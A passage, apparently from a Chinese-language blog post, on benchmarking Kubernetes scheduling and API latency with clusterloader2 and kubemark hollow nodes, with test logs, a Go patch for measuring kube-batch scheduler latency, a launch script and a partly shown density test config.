scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:33.720408 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=saturation-rc-0): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:33.723457 129068 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 2, timeout: 0, unknown: 0 I1214 15:49:33.723518 129068 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:49:33.723540 129068 simple_test_executor.go:128] Step \u0026#34;Deleting saturation pods\u0026#34; ended I1214 15:49:33.833335 129068 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:8.831ms Perc90:13.349ms Perc99:36.302ms} Count:48}; threshold: 1s I1214 15:49:33.833401 129068 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.705ms Perc90:5.171ms Perc99:32.127ms} Count:184}; threshold: 1s I1214 15:49:33.833407 129068 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:2.893ms Perc90:8.968ms Perc99:20.499ms} Count:105}; threshold: 1s I1214 15:49:33.833412 129068 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:replicationcontrollers Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:4.333ms Perc90:10.995ms Perc99:19.334ms} Count:22}; threshold: 1s I1214 15:49:33.833421 129068 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:binding Verb:POST Scope:namespace Latency:{Perc50:2.979ms Perc90:9.545ms Perc99:18.153ms} Count:24}; threshold: 1s I1214 15:49:34.572385 129068 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 15:49:34.574852 129068 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 15:49:34.574936 129068 resource_gather_worker.go:90] Closing worker for node1 I1214 15:49:34.574949 129068 container_resource_gatherer.go:180] Waitgroup finished. I1214 15:49:34.576009 129068 system_pod_metrics.go:82] skipping collection of system pod metrics I1214 15:49:44.638344 129068 simple_test_executor.go:345] Resources cleanup time: 10.059218091s I1214 15:49:44.641394 129068 clusterloader.go:177] -------------------------------------------------------------------------------- I1214 15:49:44.641440 129068 clusterloader.go:178] Test Finished I1214 15:49:44.641461 129068 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml I1214 15:49:44.641465 129068 clusterloader.go:180] Status: Success I1214 15:49:44.641467 129068 clusterloader.go:184] --------------------------------------------------------------------------------   .4 测试报告 1 2 3 4 5 6 7 8 9 10 11  [root@node1 clusterloader2]# ll reports/ -h total 260K -rw-r--r-- 1 root root 9.9K Dec 14 16:26 APIResponsiveness_density_2020-12-14T16:26:20+08:00.json -rw-r--r-- 1 root root 1.6K Dec 14 16:26 EtcdMetrics_density_2020-12-14T16:26:21+08:00.json -rw-r--r-- 1 root root 287 Dec 14 16:26 junit.xml -rw-r--r-- 1 root root 224K Dec 14 16:26 MetricsForE2E_density_2020-12-14T16:26:21+08:00.json -rw-r--r-- 1 root root 1.1K Dec 14 16:26 PodStartupLatency_SaturationPodStartupLatency_density_2020-12-14T16:25:43+08:00.json -rw-r--r-- 1 root root 3 Dec 14 16:26 ResourceUsageSummary_density_2020-12-14T16:26:21+08:00.json -rw-r--r-- 1 root root 400 Dec 14 16:26 SchedulingMetrics_density_2020-12-14T16:26:21+08:00.json -rw-r--r-- 1 root root 72 Dec 14 16:26 SchedulingThroughput_density_2020-12-14T16:25:43+08:00.json    测试的指标大多根据 metrics 获取 也有数据从 event 获取，比如 podStartupLatency  .2 kubemark节点环境 kubemark + clusterloader2方式测试\n测试环境：总节点数8个：本地虚拟机2节点 + 6个kubemark节点 虚拟机内存大小为2G\n 启动kubemark节点  1 2 3 4 5 6 7 8 9 10 11  [root@node1 wangb]# kubectl get no NAME STATUS ROLES AGE VERSION hollow-node-0 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c hollow-node-1 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c hollow-node-2 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c hollow-node-3 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c hollow-node-4 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c hollow-node-5 Ready \u0026lt;none\u0026gt; 9s v0.0.0-master+4d3c9e0c node1 Ready master,node 7d22h v1.14.8 node2 Ready node 7d22h v1.14.8   clusterloader test config.yaml  node-pod状态  首先能够看到hollow-node和真实node上(共8个节点)都运行了pod  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  test-l3zhzg-2 saturation-rc-0-gmx45 1/1 Running 0 2m19s 10.152.121.76 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-grbkl 1/1 Running 0 2m19s 10.233.90.157 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-jtw77 1/1 Running 0 2m17s 10.233.96.78 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-krzkt 1/1 Running 0 2m19s 10.88.194.43 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-kskvv 1/1 Running 0 2m16s 10.177.65.132 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-l4zbp 1/1 Running 0 2m19s 10.16.150.60 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-l89cz 1/1 Running 0 2m13s 10.118.8.133 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-lp8tp 1/1 Running 0 2m19s 10.220.39.235 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-ls9zw 1/1 Running 0 2m19s 10.15.197.103 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-m64hg 1/1 Running 0 2m14s 10.172.167.195 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-m7qct 1/1 Running 0 2m17s 10.41.26.226 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-mct9d 1/1 Running 0 2m18s 10.126.207.219 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-ml2fw 1/1 Running 0 2m13s 10.245.91.90 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-mndt2 1/1 Running 0 2m19s 10.177.227.228 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-n6tzb 1/1 Running 0 2m13s 10.76.229.141 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-nfq2d 1/1 Running 0 2m19s 10.172.121.37 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-nn4wn 1/1 Running 0 2m18s 10.22.201.220 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-nvpz7 1/1 Running 0 2m16s 10.3.93.180 hollow-node-5 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-pfw58 1/1 Running 0 2m16s 10.144.139.248 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-pqbd6 1/1 Running 0 2m17s 10.207.147.215 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-q9x97 1/1 Running 0 2m14s 10.233.90.149 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; test-l3zhzg-2 saturation-rc-0-qslqs 1/1 Running 0    pod的调度延时  1 2 3 4 5  I1215 13:59:14.776944 27607 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 2/2 ReplicationControllers are running with all pods I1215 13:59:14.777038 27607 pod_startup_latency.go:163] PodStartupLatency: labelSelector(group = saturation): gathering pod startup latency measurement... I1215 13:59:14.795377 27607 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 40 worst create-to-schedule latencies: [{test-bijvxv-1/saturation-rc-0-gktmn hollow-node-1 0s} {test-bijvxv-1/saturation-rc-0-gv9qb hollow-node-2 0s} {test-bijvxv-1/saturation-rc-0-n4cm5 hollow-node-4 0s} {test-bijvxv-2/saturation-rc-0-bn9z4 hollow-node-4 0s} {test-bijvxv-2/saturation-rc-0-srlf6 hollow-node-0 0s} {test-bijvxv-2/saturation-rc-0-btbng hollow-node-1 0s} {test-bijvxv-1/saturation-rc-0-kkcr7 hollow-node-5 0s} {test-bijvxv-2/saturation-rc-0-dctpp hollow-node-0 0s} {test-bijvxv-1/saturation-rc-0-5m8b2 hollow-node-1 0s} {test-bijvxv-1/saturation-rc-0-fpg6d hollow-node-2 0s} {test-bijvxv-1/saturation-rc-0-tjkvs hollow-node-4 0s} {test-bijvxv-2/saturation-rc-0-z6vtd hollow-node-2 0s} {test-bijvxv-2/saturation-rc-0-hrpwd hollow-node-3 0s} {test-bijvxv-2/saturation-rc-0-hzvk9 hollow-node-1 0s} {test-bijvxv-1/saturation-rc-0-x9b4c hollow-node-0 0s} {test-bijvxv-2/saturation-rc-0-4cqkz hollow-node-0 0s} {test-bijvxv-2/saturation-rc-0-4nppr node2 0s} {test-bijvxv-1/saturation-rc-0-rz69k hollow-node-2 0s} {test-bijvxv-2/saturation-rc-0-btsq4 hollow-node-3 0s} {test-bijvxv-1/saturation-rc-0-ll8sk hollow-node-3 0s} {test-bijvxv-1/saturation-rc-0-zjs57 hollow-node-1 0s} {test-bijvxv-1/saturation-rc-0-dq7x4 hollow-node-5 0s} {test-bijvxv-2/saturation-rc-0-fgxjz hollow-node-4 0s} {test-bijvxv-1/saturation-rc-0-g2bcp node1 0s} {test-bijvxv-2/saturation-rc-0-qp9pg hollow-node-3 0s} {test-bijvxv-1/saturation-rc-0-bdqzd hollow-node-5 0s} {test-bijvxv-1/saturation-rc-0-j5s2q hollow-node-4 0s} {test-bijvxv-2/saturation-rc-0-cp2wn node1 0s} {test-bijvxv-2/saturation-rc-0-2z8ct node1 0s} {test-bijvxv-2/saturation-rc-0-q6hd5 hollow-node-1 0s} {test-bijvxv-2/saturation-rc-0-68wwc hollow-node-5 0s} {test-bijvxv-2/saturation-rc-0-5t2wb hollow-node-4 0s} {test-bijvxv-1/saturation-rc-0-lt8ws hollow-node-0 0s} {test-bijvxv-1/saturation-rc-0-dwqz4 hollow-node-3 0s} {test-bijvxv-1/saturation-rc-0-vj68z node2 0s} {test-bijvxv-2/saturation-rc-0-96l5s hollow-node-5 0s} {test-bijvxv-1/saturation-rc-0-v7jq6 hollow-node-3 0s} {test-bijvxv-2/saturation-rc-0-8g4hx hollow-node-5 0s} {test-bijvxv-2/saturation-rc-0-hj7c7 hollow-node-2 0s} {test-bijvxv-1/saturation-rc-0-gx72w hollow-node-0 0s}] I1215 13:59:14.795463 27607 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 0s, perc90: 0s, perc99: 0s; threshold: 3m2s   测试1  NODES_PER_NAMESPACE 4 PODS_PER_NODE 5 MIN_LATENCY_PODS 20  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  I1215 14:05:35.050407 35029 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1215 14:05:35.050777 35029 simple_test_executor.go:128] Step \u0026#34;Deleting saturation pods\u0026#34; ended I1215 14:05:35.159705 35029 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:POST Scope:namespace Latency:{Perc50:2.613ms Perc90:11.315ms Perc99:52.045ms} Count:180}; threshold: 1s I1215 14:05:35.159757 35029 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:5.669ms Perc90:15.912ms Perc99:36.005ms} Count:360}; threshold: 1s I1215 14:05:35.159762 35029 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:binding Verb:POST Scope:namespace Latency:{Perc50:2.547ms Perc90:14.111ms Perc99:26.474ms} Count:180}; threshold: 1s I1215 14:05:35.159767 35029 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:8.703ms Perc90:20.129ms Perc99:23.056ms} Count:14}; threshold: 1s I1215 14:05:35.159772 35029 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:2.698ms Perc90:7.41ms Perc99:19.599ms} Count:905}; threshold: 1s I1215 14:05:35.470022 35029 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1215 14:05:35.470058 35029 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1215 14:05:35.470072 35029 resource_gather_worker.go:90] Closing worker for node1 I1215 14:05:35.470079 35029 container_resource_gatherer.go:180] Waitgroup finished. I1215 14:05:35.470202 35029 system_pod_metrics.go:82] skipping collection of system pod metrics I1215 14:05:45.494628 35029 simple_test_executor.go:345] Resources cleanup time: 10.023988649s I1215 14:05:45.494661 35029 clusterloader.go:177] -------------------------------------------------------------------------------- I1215 14:05:45.494665 35029 clusterloader.go:178] Test Finished I1215 14:05:45.494669 35029 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config3.yaml I1215 14:05:45.494673 35029 clusterloader.go:180] Status: Success I1215 14:05:45.494677 35029 clusterloader.go:184] --------------------------------------------------------------------------------   测试2  NODES_PER_NAMESPACE 4 PODS_PER_NODE 20 MIN_LATENCY_PODS 200  能够看到 apiserver的响应延时比上面的用例要大\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  I1215 14:16:30.674465 49564 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:6.124ms Perc90:17.215ms Perc99:36.206ms} Count:720}; threshold: 1s I1215 14:16:30.674524 49564 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:POST Scope:namespace Latency:{Perc50:2.713ms Perc90:12.849ms Perc99:35.964ms} Count:360}; threshold: 1s I1215 14:16:30.674530 49564 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:binding Verb:POST Scope:namespace Latency:{Perc50:2.481ms Perc90:11.292ms Perc99:29.995ms} Count:360}; threshold: 1s I1215 14:16:30.674535 49564 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:replicationcontrollers Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:3.972ms Perc90:8.978ms Perc99:28.475ms} Count:202}; threshold: 1s I1215 14:16:30.674543 49564 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:2.61ms Perc90:7.179ms Perc99:27.04ms} Count:1891}; threshold: 1s I1215 14:16:31.136547 49564 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1215 14:16:31.136595 49564 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1215 14:16:31.136612 49564 resource_gather_worker.go:90] Closing worker for node1 I1215 14:16:31.136619 49564 container_resource_gatherer.go:180] Waitgroup finished. I1215 14:16:31.136708 49564 system_pod_metrics.go:82] skipping collection of system pod metrics I1215 14:16:41.156280 49564 simple_test_executor.go:345] Resources cleanup time: 10.019116668s I1215 14:16:41.156316 49564 clusterloader.go:177] -------------------------------------------------------------------------------- I1215 14:16:41.156321 49564 clusterloader.go:178] Test Finished I1215 14:16:41.156326 49564 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config3.yaml I1215 14:16:41.156330 49564 clusterloader.go:180] Status: Success I1215 14:16:41.156334 49564 clusterloader.go:184] --------------------------------------------------------------------------------   测试3  NODES_PER_NAMESPACE 4 PODS_PER_NODE 25 MIN_LATENCY_PODS 200  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  I1215 16:19:38.812083 32636 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:subjectaccessreviews Subresource: Verb:POST Scope:cluster Latency:{Perc50:396µs Perc90:14.48ms Perc99:66.33ms} Count:37}; threshold: 1s I1215 16:19:38.812151 32636 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:6.048ms Perc90:32.049ms Perc99:54.374ms} Count:24}; threshold: 1s I1215 16:19:38.812159 32636 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:POST Scope:namespace Latency:{Perc50:3.118ms Perc90:12.026ms Perc99:34.693ms} Count:400}; threshold: 1s I1215 16:19:38.812169 32636 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:endpoints Subresource: Verb:PUT Scope:namespace Latency:{Perc50:2.467ms Perc90:7.957ms Perc99:34.158ms} Count:166}; threshold: 1s I1215 16:19:38.812174 32636 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:DELETE Scope:namespace Latency:{Perc50:6.106ms Perc90:13.581ms Perc99:33.557ms} Count:800}; threshold: 1s I1215 16:19:39.258943 32636 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1215 16:19:39.258993 32636 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1215 16:19:39.259012 32636 resource_gather_worker.go:90] Closing worker for node1 I1215 16:19:39.259027 32636 container_resource_gatherer.go:180] Waitgroup finished. I1215 16:19:39.259125 32636 system_pod_metrics.go:82] skipping collection of system pod metrics I1215 16:19:49.287916 32636 simple_test_executor.go:345] Resources cleanup time: 10.028043195s I1215 16:19:49.287943 32636 clusterloader.go:177] -------------------------------------------------------------------------------- I1215 16:19:49.287946 32636 clusterloader.go:178] Test Finished I1215 16:19:49.287948 32636 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config3.yaml I1215 16:19:49.287951 32636 clusterloader.go:180] Status: Success I1215 16:19:49.287954 32636 clusterloader.go:184] --------------------------------------------------------------------------------   测试4  NODES_PER_NAMESPACE 4 PODS_PER_NODE 30 MIN_LATENCY_PODS 500  API访问超时，虚拟机OOM报错，无法再运行测试用例\n4 对自定义调度器测试 源码修改 对自定义调度器kube-batch测试，pod延时的计算，原有代码使用的是k8s调度器的event，这里需要修改成kube-batch，如下 在pod_startup_latency.go中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  func (p *podStartupLatencyMeasurement) gatherScheduleTimes(c clientset.Interface) error { // custom cheduler add by wangb  const CustomSchedulerName = \u0026#34;kube-batch\u0026#34; selector := fields.Set{ \u0026#34;involvedObject.kind\u0026#34;: \u0026#34;Pod\u0026#34;, //\u0026#34;source\u0026#34;: corev1.DefaultSchedulerName,  \u0026#34;source\u0026#34;: CustomSchedulerName, }.AsSelector().String() options := metav1.ListOptions{FieldSelector: selector} schedEvents, err := c.CoreV1().Events(p.namespace).List(options) if err != nil { return err } for _, event := range schedEvents.Items { key := createMetaNamespaceKey(event.InvolvedObject.Namespace, event.InvolvedObject.Name) if _, ok := p.createTimes[key]; ok { p.scheduleTimes[key] = event.FirstTimestamp } } return nil }   重新编译成 custom_clusterloader\n配置文件 修改下test.config 和 rc.yaml\n test.config 中注意pod资源使用，适当调整大些 rc.yaml中，要对container同时设置limts和requests  custom_clusterloader运行命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # 自定义clusterloader程序：custom_clusterloader cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node1 TEST_MASTER_IP=192.168.182.101 TEST_MASTER_INTERNAL_IP=192.168.182.101 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG=\u0026#39;/home/wangb/perf-test/clusterloader2/testing/density/config-batch.yaml\u0026#39; # 测试报告目录位置 REPORT_DIR=\u0026#39;./reports\u0026#39; # 测试日志打印文件 LOG_FILE=\u0026#39;test.log\u0026#39; ./custom_clusterloader --kubeconfig=$KUBE_CONFIG \\  --mastername=$TEST_MASTER_IP \\  --masterip=$MASTER_IP \\  --master-internal-ip=TEST_MASTER_INTERNAL_IP \\  --testconfig=$TEST_CONFIG \\  --report-dir=$REPORT_DIR \\  --alsologtostderr 2\u0026gt;\u0026amp;1 | tee $LOG_FILE   5 压力测试配置和执行脚本 1 benchmark测试 benchmark测试是测试k8s调度器性能和pod延时指标\nconfig-benchmark.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258  # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).# cnofig-benchmark 测试标准k8s调度器和其它k8s标准组件性能#Constants# {{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;\u0026#34;}}# 根据100节点规模，使用100_nodes/constraints.yaml进行测试{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;./100_nodes/constraints.yaml\u0026#34;}}# {{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;allnodes\u0026#34;}}{{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;master\u0026#34;}}# 至少保证100个节点规模# 设置 NODES_PER_NAMESPACE 50，保证totalPods = 5000{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# 设置 NODES_PER_NAMESPACE 100，保证totalPods = 10000# {{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# PODS_PER_NODE 0 则禁用saturation{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 10}}# 并发数，目前aist 调度器 处理业务并发数20，会有阻塞。# DENSITY_TEST_THROUGHPUT 10 或 20 进行测试 注意跟下面tuningSets配置 qpsLoad: qps 保持一致{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 5}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.# {{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}# {{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 35}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 10}}# MIN_LATENCY_PODS为0，则禁用latency# {{$MIN_LATENCY_PODS := 0}}{{$MIN_LATENCY_PODS := 0}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \u0026#34;\u0026#34;}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}# 总pod数量：ns数量*每个ns的pod数（ PODS_PER_NODE * NODES_PER_NAMESPACE ）{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}# 如果 SATURATION, 设置 latencyReplicas = 0 则禁用latency# {{$latencyReplicas := 0}}# if latency set latency{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}# {{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$saturationRCTimeout := 3600}}{{$podsTimeout := DivideFloat $totalLatencyPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$latencyPodsTimeout := MaxInt $podsTimeout 7200}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won\u0026#39;t fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711# 这里的超时 是wait_for_controlled_pods 时使用，一旦超过阈值，就会设置该pod为timeout# {{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 3600}}{{$latencyRCHardTimeout := MaxInt $latencyPodsTimeout 3600}}# add by binge# SchedulingThroughput 默认是在saturation中添加，自定义又在latency添加# 为避免调度器2个场景中的调度器吞吐量混淆，每次只统计一种场景下的调度器吞吐量SchedulingThroughput# 可以通过设置某场景的pod副本数为0方式，禁用该场景name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:# qps: 5# custom valueqps:{{$DENSITY_TEST_THROUGHPUT}}{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}# Create saturation pods- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = saturationthreshold:{{$saturationRCTimeout}}s- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = saturationoperationTimeout:{{$saturationRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:1tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc-benchmark.yamltemplateFillMap:Replicas:{{$podsPerNamespace}}Group:saturationCpuRequest:10mMemoryRequest:10M- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = saturation- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Creating saturation pods# Create latency pods- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = latencythreshold:{{$latencyPodsTimeout}}s# custom threshold params == saturationRCTimeout# latency SchedulingThroughput add by binge- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = latency- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = latency# operationTimeout: 15moperationTimeout:{{$latencyRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:{{$latencyReplicas}}tuningSet:Uniform5qpsobjectBundle:- 